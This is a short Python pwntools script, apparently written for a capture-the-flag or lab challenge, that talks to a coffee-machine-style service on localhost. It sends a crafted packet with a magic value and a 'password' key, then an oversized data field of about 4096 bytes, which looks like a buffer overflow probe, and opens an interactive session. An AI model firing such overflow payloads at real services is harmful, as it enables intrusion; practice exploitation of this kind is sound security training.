#!/usr/bin/python3

from pwn import *
import base64

host = 'localhost'
port = 9055
p = remote(host,port)

"""
> Action
    1 -> Reboot
    2 -> Make Coffee
    3 -> Shutdown

> Type
    0 -> Espresso
    1 -> Testcase

> Size
    0 -> Small
    1 -> Medium
    2 -> Large
    d -> None
"""

payload1 =  p32(0x1337)     # Magic
payload1 += p32(0x2)        # Action (Make coffee)
payload1 += p32(0x0)        # Length
payload1 += base64.b64encode(b"password\0")     # Key

p.send(payload1)

payload2 =  p32(0x1337)     # Magic
payload2 += p32(0x20)       # Temperature
payload2 += p32(0x1)        # Type
payload2 += p32(0x2)        # Size
payload2 += b"B"*55 #+ b'\0' # Data
payload2 += b"C"*(4096-55)    # Data padding
payload2 += p32(0x42*255)   # Checksum

p.send(payload2)

p.interactive()
